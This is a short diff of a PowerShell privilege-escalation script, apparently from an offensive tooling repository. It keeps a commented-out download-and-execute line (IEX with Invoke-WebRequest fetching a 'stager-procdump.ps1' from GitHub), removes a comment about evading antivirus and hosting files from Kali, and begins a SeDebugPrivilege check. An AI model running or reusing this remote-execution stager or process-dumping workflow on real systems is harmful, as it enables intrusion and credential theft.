@@ -1,5 +1,5 @@
 #IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/stager-procdump.ps1")
-#This will automate the procdump process, but will likely trigger AV so needs some work. Kali should be configured to host a python web server.
+
 
 function Check-SeDebugPrivilege {
     Write-Output "Checking SeDebugPrivilege..."
